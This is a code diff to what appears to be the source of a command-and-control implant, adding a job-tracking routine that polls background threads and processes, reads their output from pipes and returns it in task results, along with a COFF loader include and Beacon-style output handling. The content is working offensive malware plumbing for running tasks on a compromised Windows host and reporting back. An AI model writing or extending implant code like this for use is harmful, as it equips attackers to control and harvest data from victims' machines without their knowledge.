@@ -1,8 +1,11 @@
 #include "Implant.h"
 #include "Command.h"
 #include "Channel.h"
+#include "Coff.h"
 
 IImplant				g_Implant;
+
+BOOL ImplantCheckJobs(json &result);
 
 // ImplantTaskExecute
 //
@@ -11,6 +14,14 @@ static BOOL ImplantTaskExecute(std::vector<json>& queue, json& result) {
 	string	name;
 	json	args;
 	string	artifact;
+
+
+
+	// priority to commands output
+	if (queue.empty()) {
+		ImplantCheckJobs(result);
+		return TRUE;
+	}
 
 	if (queue.empty()) {
 		return TRUE;
@@ -34,9 +45,129 @@ static BOOL ImplantTaskExecute(std::vector<json>& queue, json& result) {
 	// dispatch the task to the correct handler
 	for (const auto& command : g_CommandRegistry) {
 		if (command.Name == name) {
+			result["name"] = command.Name;
 			command.Invoke(args, artifact, result);
 			return TRUE;
 		}
+	}
+
+	// check if jobs finished
+	return FALSE;
+}
+
+BOOL ImplantCheckJobs(json &result) {
+	LIST_ENTRY* current = g_Implant.JobList.Flink;
+
+	while (current != &g_Implant.JobList) {
+		PJOB Job = CONTAINING_RECORD(current, JOB, ListEntry);
+		DWORD ExitCode = 0;
+
+
+		if (Job->Type == JOB_TYPE_THREAD) {
+			GetExitCodeThread(Job->hThread, &ExitCode);
+			if (ExitCode == STILL_ACTIVE) {
+				goto NextNode;
+			}
+			
+			
+			INT     OutputSize      = 0;
+    		PCHAR   Output          = BeaconGetOutputData(&OutputSize);
+    		Output[OutputSize]      = '\0';
+			result["job"] 			= Job->ID;
+	    	result["output"] 		= Output;    
+
+			CloseHandle(Job->hThread);
+			RemoveEntryList(&Job->ListEntry);
+			HeapFree(GetProcessHeap(), 0, Job);
+    		free(Output);
+
+			return TRUE;
+		} else if (Job->Type == JOB_TYPE_PROCESS) {
+			// check if job is done
+			GetExitCodeProcess(Job->hProcess, &ExitCode);
+			if (ExitCode == STILL_ACTIVE) {
+				DWORD BytesToRead = 0;
+
+				if (!PeekNamedPipe(Job->hAnonPipe, NULL, 0, NULL, &BytesToRead, 0) || !BytesToRead)
+				{
+					if (GetLastError() == ERROR_BROKEN_PIPE) {
+						printf("unexpected process exit\n");
+
+						result["job"] 		= Job->ID;
+	    				result["output"] 	= "[-] job crashed";
+						CloseHandle(Job->hProcess);
+	    				CloseHandle(Job->hAnonPipe);
+						RemoveEntryList(&Job->ListEntry);
+						return TRUE;
+					}
+
+					goto NextNode;
+				}	
+
+				CHAR* Output = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BytesToRead + 1);
+				if (!Output) {
+					printf("HeapAlloc failed: ( %d )\n", GetLastError());
+					goto NextNode;
+				}
+
+				if (!ReadFile(Job->hAnonPipe, Output, BytesToRead, NULL, NULL)) {
+					printf("ReadFile failed: ( %d )\n", GetLastError());
+					goto NextNode;
+				}
+
+				Output[BytesToRead] = '\0';
+
+				result ["job"] 		= Job->ID;
+	    		result["output"] 	= Output;    
+	    		HeapFree(GetProcessHeap(), 0, Output);
+				return TRUE;
+			} else {
+				// read all and mark job as done
+				DWORD BytesToRead = 0;
+
+				if (!PeekNamedPipe(Job->hAnonPipe, NULL, 0, NULL, &BytesToRead, NULL)) {
+					if (GetLastError() == ERROR_BROKEN_PIPE) {
+						printf("process terminated but unexpected process exit\n");
+						result["job"] 		= Job->ID;
+	    				result["output"] 	= "[-] job crashed";
+						CloseHandle(Job->hProcess);
+	    				CloseHandle(Job->hAnonPipe);
+						RemoveEntryList(&Job->ListEntry);
+						HeapFree(GetProcessHeap(), 0, Job);
+
+						return TRUE;
+					}
+
+					printf("PeekNamedPipe failed: ( %d )\n", GetLastError());
+					return FALSE;
+				}
+
+				CHAR* Output = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BytesToRead + 1);
+				if (!Output) {
+					printf("HeapAlloc failed: ( %d )\n", GetLastError());
+					goto NextNode;
+				}
+
+				if (!ReadFile(Job->hAnonPipe, Output, BytesToRead, NULL, NULL)) {
+					printf("ReadFile failed: ( %d )\n", GetLastError());
+					goto NextNode;
+				}
+
+				Output[BytesToRead] = '\0';
+
+				result["job"] 		= Job->ID;
+	    		result["output"] 	= Output;    
+				CloseHandle(Job->hProcess);
+	    		CloseHandle(Job->hAnonPipe);
+				RemoveEntryList(&Job->ListEntry);
+
+				HeapFree(GetProcessHeap(), 0, Job);
+				HeapFree(GetProcessHeap(), 0, Output);
+				return TRUE;
+			}
+		}
+NextNode:
+		current = current->Flink;
 	}
 
 	return FALSE;
@@ -153,6 +284,8 @@ BOOL ImplantInitialize() {
 	
 	// Implant interface
 	g_Implant.SessionID	= RandomUint32();
+
+	InitializeListHead(&g_Implant.JobList);
 
 	// Initialize channel
 	if (!ChannelInitialize()) {
